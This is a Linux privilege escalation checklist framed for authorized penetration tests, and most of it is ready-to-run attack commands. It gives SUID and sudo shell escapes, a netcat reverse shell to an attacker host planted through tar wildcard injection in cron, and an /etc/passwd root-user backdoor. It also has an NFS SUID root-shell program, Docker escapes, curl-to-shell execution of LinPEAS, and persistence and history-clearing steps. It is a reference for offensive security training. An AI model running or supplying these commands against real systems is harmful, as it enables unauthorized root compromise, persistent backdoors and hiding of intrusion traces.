# Linux Privilege Escalation Checklist

Systematic methodology for escalating privileges on Linux systems during authorized penetration tests.

---

## 1. Initial Reconnaissance

### System Information
- [ ] `uname -a` — Kernel version and architecture
- [ ] `cat /etc/os-release` — OS distribution and version
- [ ] `cat /etc/issue` — OS banner
- [ ] `hostname` — System hostname
- [ ] `whoami` — Current user
- [ ] `id` — User ID, group IDs, and groups
- [ ] `cat /etc/passwd` — All user accounts
- [ ] `cat /etc/shadow` — Password hashes (if readable)
- [ ] `cat /etc/group` — All groups

### Running Processes
- [ ] `ps aux` — All running processes
- [ ] `ps -ef` — Alternative process listing
- [ ] `top` or `htop` — Interactive process viewer
- [ ] `cat /proc/version` — Kernel version from procfs
- [ ] `ls -la /proc/<PID>/cmdline` — Process command lines

### Network Connections
- [ ] `netstat -tulpn` — Listening services
- [ ] `ss -tulpn` — Modern alternative to netstat
- [ ] `ip a` — Network interfaces and IPs
- [ ] `iptables -L` — Firewall rules (if accessible)
- [ ] `cat /etc/hosts` — Hosts file entries

---

## 2. SUID/SGID Binaries

### Find SUID Binaries
```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
```

### Find SGID Binaries
```bash
find / -perm -2000 -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null
```

### Common Exploitable SUID Binaries
- [ ] `vim` — `!/bin/sh` from within vim
- [ ] `find` — `find . -exec /bin/sh \; -quit`
- [ ] `nmap` — `--interactive` → `!sh`
- [ ] `python/perl/ruby` — Spawn shell from interpreter
- [ ] `bash` — `bash -p` (if SUID)
- [ ] `less/more/man` — `!/bin/sh` from pager
- [ ] `cp/mv` — Overwrite `/etc/shadow` or `/etc/passwd`
- [ ] `wget/curl` — Upload/download files as root
- [ ] `awk` — `awk 'BEGIN {system("/bin/sh")}'`

### GTFObins Reference
- Always check [GTFObins](https://gtfobins.github.io/) for SUID abuse techniques

---

## 3. Sudo Misconfigurations

### Check Sudo Permissions
```bash
sudo -l
```

### Common Misconfigurations
- [ ] `ALL=(ALL) NOPASSWD: ALL` — Full root access
- [ ] `NOPASSWD: /usr/bin/vim` — Edit files as root
- [ ] `NOPASSWD: /usr/bin/find` — Execute commands as root
- [ ] `NOPASSWD: /bin/bash` — Direct shell as root
- [ ] `NOPASSWD: /usr/bin/pip` — Install malicious package as root
- [ ] Wildcard abuse: `/usr/bin/*` — Any binary in path

### Sudo Exploitation Examples
```bash
# Vim as root
sudo vim -c ':!/bin/sh'

# Find as root
sudo find / -exec /bin/sh \; -quit

# Pip as root (install malicious package)
TF=$(mktemp -d)
echo 'import os; os.execv("/bin/sh", ["sh"])' > $TF/setup.py
sudo pip install $TF

# Apache2 config edit
sudo apache2ctl -f /etc/shadow
```

---

## 4. Cron Jobs

### Check System Cron
```bash
cat /etc/crontab
ls -la /etc/cron.*
crontab -l
ls -la /var/spool/cron/
```

### Identify Writable Scripts
```bash
# Find world-writable cron scripts
find /etc/cron* -writable -type f 2>/dev/null
find /var/spool/cron -writable -type f 2>/dev/null

# Check for wildcard injection
ls -la /path/to/cron/script*
```

### Exploitation
- [ ] Replace cron script with reverse shell
- [ ] Wildcard injection in `tar` or `rsync` cron jobs
- [ ] Create malicious script in writable cron directory

### Example: Wildcard Injection
```bash
# If cron runs: tar cf /backup.tar /var/www/*
echo 'mkfifo /tmp/lol; nc attacker_ip 4444 0</tmp/lol | /bin/sh >/tmp/lol 2>&1; rm /tmp/lol' > shell.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
```

---

## 5. Writable Files and Directories

### World-Writable Files
```bash
find / -writable -type f ! -path "/proc/*" ! -path "/sys/*" 2>/dev/null
find / -perm -o+w -type f 2>/dev/null | grep -v "/proc\|/sys"
```

### World-Writable Directories
```bash
find / -writable -type d ! -path "/proc/*" ! -path "/sys/*" 2>/dev/null
find / -perm -o+w -type d 2>/dev/null | grep -v "/proc\|/sys"
```

### Key Files to Check
- [ ] `/etc/passwd` — Can you add a user?
- [ ] `/etc/shadow` — Can you read/modify hashes?
- [ ] `/etc/sudoers` — Can you grant sudo access?
- [ ] `/etc/crontab` — Can you add malicious cron jobs?
- [ ] `~/.ssh/authorized_keys` — Can you add your SSH key?
- [ ] Web root files — Can you upload web shells?

### Add Root User via /etc/passwd
```bash
# Generate password hash
openssl passwd -1 -salt hacker 'password123'

# Append to /etc/passwd (if writable)
echo 'hacker:$1$hacker$<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd

# Switch to new user
su hacker
```

---

## 6. Kernel Exploits

### Check Kernel Version
```bash
uname -r
cat /proc/version
```

### Search for Exploits
```bash
# Searchsploit
searchsploit linux kernel <version>

# Online databases
# https://www.exploit-db.com/
# https://github.com/lucyoa/kernel-exploits
```

### Common Kernel Exploits
- [ ] **Dirty COW** (CVE-2016-5195) — Write to read-only files
- [ ] **Dirty Pipe** (CVE-2022-0847) — Overwrite read-only files
- [ ] **eBPF exploits** — Various CVEs in 5.x kernels
- [ ] **OverlayFS** — CVE-2021-3493 (Ubuntu)
- [ ] **PwnKit** (CVE-2021-4034) — Polkit vulnerability

### Important Notes
- Kernel exploits can crash the system — use as last resort
- Test in a controlled environment first
- Some exploits require specific kernel configs

---

## 7. Capabilities

### Check File Capabilities
```bash
getcap -r / 2>/dev/null
```

### Exploitable Capabilities
- [ ] `cap_setuid+ep` — Set UID to 0 (root)
  ```bash
  ./binary_with_cap_setuid
  python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
  ```
- [ ] `cap_dac_read_search+ep` — Read any file
  ```bash
  ./binary - read /etc/shadow
  ```
- [ ] `cap_net_raw+ep` — Raw socket access (packet sniffing)
- [ ] `cap_sys_admin+ep` — Near-root capabilities

---

## 8. Passwords and Credentials

### Search for Credentials
```bash
# History files
cat ~/.bash_history
cat ~/.zsh_history
cat ~/.mysql_history

# Config files
grep -r "password" /etc/ 2>/dev/null
grep -r "pass" /opt/ /var/ 2>/dev/null

# SSH keys
ls -la ~/.ssh/
cat ~/.ssh/id_rsa

# Environment variables
env | grep -i pass
env | grep -i key
```

### Credential Files
- [ ] `~/.ssh/id_rsa` — Private SSH keys
- [ ] `~/.aws/credentials` — AWS keys
- [ ] `~/.config/gcloud/` — GCP credentials
- [ ] `/var/lib/mysql/` — Database credentials
- [ ] `/opt/` — Application configs
- [ ] `/var/www/` — Web app configs (wp-config.php, .env)

### Crack Passwords
```bash
# If /etc/shadow is readable
unshadow /etc/passwd /etc/shadow > hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# SSH key with passphrase
ssh2john id_rsa > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

---

## 9. NFS Shares

### Check NFS Exports
```bash
cat /etc/exports
showmount -e <target_ip>
```

### Exploit No Root Squash
```bash
# If NFS share has no_root_squat
mount -t nfs <target_ip>:/shared /mnt/nfs

# Create SUID binary
echo 'int main() { setuid(0); setgid(0); system("/bin/sh"); }' > rootshell.c
gcc rootshell.c -o /mnt/nfs/rootshell
chmod +s /mnt/nfs/rootshell

# Execute on target
./rootshell
```

---

## 10. Docker and Container Escapes

### Check Docker Access
```bash
docker ps
docker images
id  # Check if in docker group
```

### Container Escape Techniques
- [ ] **Privileged container**: Mount host filesystem
  ```bash
  docker run -it --privileged -v /:/host alpine chroot /host /bin/sh
  ```
- [ ] **Docker socket exposed**:
  ```bash
  docker -H unix:///var/run/docker.sock run -it -v /:/host alpine chroot /host /bin/sh
  ```
- [ ] **Host PID namespace**:
  ```bash
  docker run -it --pid=host alpine nsenter -t 1 -m -u -n -i sh
  ```

---

## 11. Automated Tools

### Run LinPEAS
```bash
# Download and execute
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Or transfer manually
wget https://github.com/carlospolop/PEASS-ng/raw/master/linPEAS/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

### Other Tools
- [ ] **Linux Smart Enumeration**: `linux-smart-enumeration`
- [ ] **Linux Exploit Suggester**: `linux-exploit-suggester-2`
- [ ] **Pspy**: Monitor processes without root access

---

## 12. Post-Escalation

### After Gaining Root
- [ ] `whoami` — Confirm root access
- [ ] `id` — Verify UID 0
- [ ] `cat /root/root.txt` — Capture flag (CTF)
- [ ] Dump password hashes: `cat /etc/shadow`
- [ ] Check for other users: `cat /etc/passwd`
- [ ] Establish persistence:
  - [ ] Add SSH key to `/root/.ssh/authorized_keys`
  - [ ] Create backdoor user in `/etc/passwd`
  - [ ] Add cron job for reverse shell
  - [ ] Install rootkit (if in scope)

### Clean Up
- [ ] Remove temporary files
- [ ] Clear bash history: `history -c && unset HISTFILE`
- [ ] Restore modified files (if needed)
- [ ] Document all steps for report

---

## Quick Reference: PrivEsc Priority

1. **Sudo misconfigurations** — Easiest, most reliable
2. **SUID binaries** — Check GTFObins
3. **Writable files** — `/etc/passwd`, cron jobs
4. **Kernel exploits** — Risky, use last
5. **Credentials** — Search configs, history
6. **NFS/Docker** — Specific to environment
7. **Capabilities** — Often overlooked

---

## Tools Summary

| Tool | Purpose | URL |
|------|---------|-----|
| LinPEAS | Automated enumeration | github.com/carlospolop/PEASS-ng |
| Linux Smart Enumeration | Alternative to LinPEAS | github.com/diego-treitos/linux-smart-enumeration |
| Linux Exploit Suggester | Kernel exploit finder | github.com/mzet-/linux-exploit-suggester |
| Pspy | Process monitoring | github.com/DominicBreuker/pspy |
| GTFObins | SUID/capability abuse | gtfobins.github.io |

---

*Last updated: 2026-04-06*
